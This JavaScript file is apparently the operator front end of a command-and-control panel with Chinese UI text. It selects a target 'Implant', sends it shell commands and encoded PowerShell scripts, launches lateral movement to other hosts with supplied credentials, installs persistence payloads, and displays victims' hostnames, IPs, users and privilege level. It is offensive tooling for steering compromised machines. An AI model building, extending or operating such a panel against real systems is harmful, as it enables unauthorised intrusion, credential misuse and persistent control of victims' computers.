// Toolkit page - agent selector, category toggles, command execution, modals, results

let selectedAgentId = '';

(function initToolkitPage() {
    const agentSelect = document.getElementById('toolkit-agent-select');
    const toolkitSearch = document.getElementById('toolkit-search');
    if (!agentSelect || !toolkitSearch) return;

    agentSelect.addEventListener('change', function() {
    selectedAgentId = this.value;
    const badge = document.getElementById('selected-agent-badge');
    const name = document.getElementById('selected-agent-name');
    const infoPanel = document.getElementById('agent-info-panel');
    if (selectedAgentId) {
        badge.classList.remove('hidden');
        name.textContent = this.options[this.selectedIndex].text;
        infoPanel.classList.remove('hidden');
        loadAgentInfo(selectedAgentId);
        document.querySelectorAll('.cmd-btn, .quick-action-btn').forEach(btn => {
            btn.disabled = false;
            btn.classList.remove('opacity-50', 'cursor-not-allowed');
        });
    } else {
        badge.classList.add('hidden');
        infoPanel.classList.add('hidden');
        document.querySelectorAll('.cmd-btn, .quick-action-btn').forEach(btn => {
            btn.disabled = true;
            btn.classList.add('opacity-50', 'cursor-not-allowed');
        });
    }
    });

    document.querySelectorAll('.cmd-btn, .quick-action-btn').forEach(btn => {
        btn.disabled = true;
        btn.classList.add('opacity-50', 'cursor-not-allowed');
    });

    toolkitSearch.addEventListener('input', function() {
        const q = this.value.toLowerCase();
        document.querySelectorAll('.cmd-btn').forEach(btn => {
            const text = btn.textContent.toLowerCase();
            btn.closest('.category-body')?.classList.remove('hidden');
            if (q === '') {
                btn.style.display = '';
            } else {
                btn.style.display = text.includes(q) ? '' : 'none';
            }
        });
    });

    document.querySelectorAll('.quick-action-btn, .cmd-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!selectedAgentId) {
                showToast('请先选择目标 Implant', 'warning');
                return;
            }
            const action = this.dataset.action;
            if (action) {
                executeQuickAction(action, '');
            }
        });
    });
})();

function toggleCategory(header) {
    const body = header.nextElementSibling;
    const icon = header.querySelector('.fa-chevron-down');
    body.classList.toggle('hidden');
    icon.classList.toggle('rotate-180');
}

function expandAllCategories() {
    document.querySelectorAll('.category-body').forEach(body => {
        body.classList.remove('hidden');
        body.closest('.bg-white')?.querySelector('.fa-chevron-down')?.classList.add('rotate-180');
    });
}

function collapseAllCategories() {
    document.querySelectorAll('.category-body').forEach(body => {
        body.classList.add('hidden');
        body.closest('.bg-white')?.querySelector('.fa-chevron-down')?.classList.remove('rotate-180');
    });
}

function executeQuickAction(action, param) {
    const formData = new FormData();
    formData.append('action', action);
    formData.append('param', param);
    formData.append('shell', 'cmd.exe');

    showToast(`执行: ${action}...`, 'info');

    fetch(`/toolkit/agents/${selectedAgentId}/action`, {
        method: 'POST',
        body: new URLSearchParams(formData)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showToast(`任务已发送 (ID: ${data.task_id})`, 'success');
            refreshRecentResults();
        } else {
            showToast('执行失败: ' + (data.error || '未知错误'), 'error');
        }
    })
    .catch(err => showToast('请求失败: ' + err.message, 'error'));
}

function showCustomCmdModal() {
    if (!selectedAgentId) { showToast('请先选择目标 Implant', 'warning'); return; }
    document.getElementById('custom-cmd-modal').classList.remove('hidden');
}

function showPowerShellModal() {
    if (!selectedAgentId) { showToast('请先选择目标 Implant', 'warning'); return; }
    document.getElementById('ps-modal').classList.remove('hidden');
}

function showLateralModal() {
    if (!selectedAgentId) { showToast('请先选择目标 Implant', 'warning'); return; }
    document.getElementById('lateral-modal').classList.remove('hidden');
}

function showPersistenceModal() {
    if (!selectedAgentId) { showToast('请先选择目标 Implant', 'warning'); return; }
    document.getElementById('persistence-modal').classList.remove('hidden');
}

function closeModal(id) {
    document.getElementById(id).classList.add('hidden');
}

function sendCustomCmd() {
    const cmd = document.getElementById('custom-cmd-input').value.trim();
    const shell = document.getElementById('custom-cmd-shell').value;
    if (!cmd) { showToast('请输入命令', 'warning'); return; }
    closeModal('custom-cmd-modal');
    executeQuickAction('shell', cmd);
}

function sendPowerShell() {
    const script = document.getElementById('ps-input').value.trim();
    if (!script) { showToast('请输入 PowerShell 脚本', 'warning'); return; }
    closeModal('ps-modal');
    executeQuickAction('powershell', btoa(unescape(encodeURIComponent(script))));
}

function sendLateral() {
    const target = document.getElementById('lateral-target').value.trim();
    const method = document.getElementById('lateral-method').value;
    const cmd = document.getElementById('lateral-command').value.trim();
    const user = document.getElementById('lateral-user').value.trim();
    const pass = document.getElementById('lateral-pass').value.trim();
    if (!target || !cmd) { showToast('请填写目标和命令', 'warning'); return; }
    closeModal('lateral-modal');
    const lateralCmd = `lateral:${method}:${target}:${cmd}:${user}:${pass}`;
    executeQuickAction('shell', lateralCmd);
}

function sendPersistence() {
    const method = document.getElementById('persistence-method').value;
    const payload = document.getElementById('persistence-payload').value.trim();
    if (!payload) { showToast('请填写载荷路径', 'warning'); return; }
    closeModal('persistence-modal');
    const persistCmd = `persist:${method}:${payload}`;
    executeQuickAction('shell', persistCmd);
}

function loadAgentInfo(agentId) {
    fetch(`/toolkit/agents/${agentId}/info`)
        .then(r => r.json())
        .then(data => {
            if (data.agent) {
                document.getElementById('info-hostname').textContent = data.agent.hostname || '—';
                document.getElementById('info-ip').textContent = data.agent.ip || '—';
                document.getElementById('info-user').textContent = data.agent.username || '—';
                document.getElementById('info-os').textContent = (data.agent.os || '') + ' ' + (data.agent.arch || '');
                const integrityEl = document.getElementById('info-integrity');
                const integrity = data.agent.integrity || '—';
                const isElevated = data.agent.elevated;
                integrityEl.innerHTML = isElevated
                    ? '<span class="text-red-600 font-medium">' + integrity + ' (提权)</span>'
                    : '<span class="text-slate-700">' + integrity + '</span>';
                document.getElementById('info-task-count').textContent = data.task_count || '0';
                document.getElementById('info-success-rate').textContent = data.success_rate ? data.success_rate + '%' : '—';
            }
        })
        .catch(() => {});
}

function refreshRecentResults() {
    fetch('/toolkit/results')
        .then(r => r.json())
        .then(data => {
            const container = document.getElementById('recent-results');
            if (!data.tasks || data.tasks.length === 0) {
                container.innerHTML = '<div class="px-4 py-8 text-center text-slate-400 text-xs"><i class="fa-solid fa-inbox text-2xl mb-2 block"></i>还没有任务结果</div>';
                return;
            }
            container.innerHTML = data.tasks.map(t => `
                <div class="px-4 py-3 hover:bg-slate-50 transition-colors cursor-pointer" onclick="toggleResultPreview(this)" data-task-id="${t.id}">
                    <div class="flex items-center justify-between mb-1">
                        <span class="text-[10px] font-mono text-slate-400 truncate max-w-[100px]">${t.agent_id ? t.agent_id.substring(0,8) : '—'}</span>
                        <span class="text-[10px] px-1.5 py-0.5 rounded font-medium ${t.status === 'completed' ? 'text-emerald-600 bg-emerald-50' : 'text-red-600 bg-red-50'}">
                            ${t.status === 'completed' ? '完成' : '失败'}
                        </span>
                    </div>
                    <div class="text-xs font-medium text-slate-700 truncate">${t.type}: ${(t.command || '').substring(0, 40)}</div>
                    <div class="text-[10px] text-slate-400 mt-0.5">${t.created_at || ''}</div>
                    <div class="hidden mt-2 p-2 bg-slate-800 text-green-300 text-[10px] font-mono rounded-lg max-h-32 overflow-y-auto whitespace-pre-wrap">${t.result || ''}</div>
                </div>
            `).join('');
        })
        .catch(() => {});
}

function toggleResultPreview(el) {
    const preview = el.querySelector('.result-preview');
    if (preview) {
        preview.classList.toggle('hidden');
    }
}

setInterval(refreshRecentResults, 10000);
